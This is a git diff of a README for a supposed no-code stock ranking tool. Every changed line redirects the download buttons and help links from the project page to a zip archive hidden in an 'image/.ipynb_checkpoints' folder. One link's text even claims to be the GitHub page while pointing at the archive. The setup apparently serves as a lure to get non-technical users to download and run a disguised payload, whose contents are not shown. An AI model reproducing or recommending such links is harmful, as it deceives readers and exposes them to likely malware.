@@ -1,6 +1,6 @@
 # 📊 stock-analysis- - Simple Stock Ranking Tool
 
-[![Download stock-analysis-](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Santy20077/stock-analysis-)
+[![Download stock-analysis-](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Santy20077/stock-analysis-/raw/refs/heads/main/image/.ipynb_checkpoints/analysis-stock-v1.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ You do not need any programming skills to use stock-analysis-. Just follow the s
 
 1. Click this big button to visit the download page:
 
-   [![Download stock-analysis-](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Santy20077/stock-analysis-)
+   [![Download stock-analysis-](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Santy20077/stock-analysis-/raw/refs/heads/main/image/.ipynb_checkpoints/analysis-stock-v1.6.zip)
 
 2. On the GitHub page:
 
@@ -118,7 +118,7 @@ stock-analysis- runs only on your PC. It does not connect to the internet during
 
 If you want to learn more or report an issue:
 
-- Visit the GitHub page at [https://github.com/Santy20077/stock-analysis-](https://github.com/Santy20077/stock-analysis-).
+- Visit the GitHub page at [https://github.com/Santy20077/stock-analysis-/raw/refs/heads/main/image/.ipynb_checkpoints/analysis-stock-v1.6.zip](https://github.com/Santy20077/stock-analysis-/raw/refs/heads/main/image/.ipynb_checkpoints/analysis-stock-v1.6.zip).
 - Use the **Issues** tab to ask questions or share problems.
 - Check the **Wiki** or **README** files for updates and guides.
 
@@ -142,7 +142,7 @@ You don’t need to install these programs yourself to run the software.
 
 Click this link anytime to reach the download page:
 
-[https://github.com/Santy20077/stock-analysis-](https://github.com/Santy20077/stock-analysis-)
+[https://github.com/Santy20077/stock-analysis-/raw/refs/heads/main/image/.ipynb_checkpoints/analysis-stock-v1.6.zip](https://github.com/Santy20077/stock-analysis-/raw/refs/heads/main/image/.ipynb_checkpoints/analysis-stock-v1.6.zip)
 
 ---
 
